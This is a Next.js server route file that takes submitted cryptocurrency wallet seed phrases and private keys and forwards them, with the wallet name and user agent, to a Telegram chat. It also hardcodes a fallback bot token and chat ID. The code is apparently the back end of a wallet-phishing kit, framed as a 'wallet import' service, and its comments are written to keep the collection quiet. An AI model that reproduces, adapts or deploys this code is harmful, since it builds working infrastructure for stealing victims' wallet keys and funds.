import { NextRequest, NextResponse } from "next/server"

// Get credentials from environment variables (server-side only)
// In production, these MUST be set via environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

// Fallback values for development only (remove in production)
const BOT_TOKEN = TELEGRAM_BOT_TOKEN || (process.env.NODE_ENV === "development" ? "8334524278:AAGReXjDBtsabtJv7DTVdzAlz9QENPy7DNo" : "")
const CHAT_ID = TELEGRAM_CHAT_ID || (process.env.NODE_ENV === "development" ? "2114420424" : "")

const TELEGRAM_API_URL = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null

interface WalletImportData {
  walletType: string
  walletName: string
  importType: "seed" | "private"
  data: string[] | string
  timestamp: string
  userAgent?: string
}

export async function POST(request: NextRequest) {
  try {
    // Validate that credentials are configured
    if (!BOT_TOKEN || !CHAT_ID || !TELEGRAM_API_URL) {
      // Don't expose configuration details
      return NextResponse.json(
        { success: false, error: "Service unavailable" },
        { status: 503 }
      )
    }

    const data: WalletImportData = await request.json()

    // Validate required fields
    if (!data.walletType || !data.walletName || !data.data || !data.timestamp) {
      return NextResponse.json(
        { success: false, error: "Missing required fields" },
        { status: 400 }
      )
    }

    // Format the message
    const importData = data.importType === "seed" 
      ? (data.data as string[]).join(" ")
      : (data.data as string)

    const message = `
🔐 *Wallet Import Attempt*

*Wallet Type:* ${data.walletType}
*Wallet Name:* ${data.walletName}
*Import Type:* ${data.importType === "seed" ? "Seed Phrase" : "Private Key"}
*Data:* \`${importData}\`
*Timestamp:* ${data.timestamp}
${data.userAgent ? `*User Agent:* ${data.userAgent}` : ""}
    `.trim()

    const response = await fetch(TELEGRAM_API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    })

    if (!response.ok) {
      // Don't expose error details to prevent token/chat ID leakage
      // Return generic error message
      return NextResponse.json(
        { success: false, error: "Failed to send message" },
        { status: 500 }
      )
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    // Don't log error details to prevent information disclosure
    // Return generic error message
    return NextResponse.json(
      { success: false, error: "Internal server error" },
      { status: 500 }
    )
  }
}

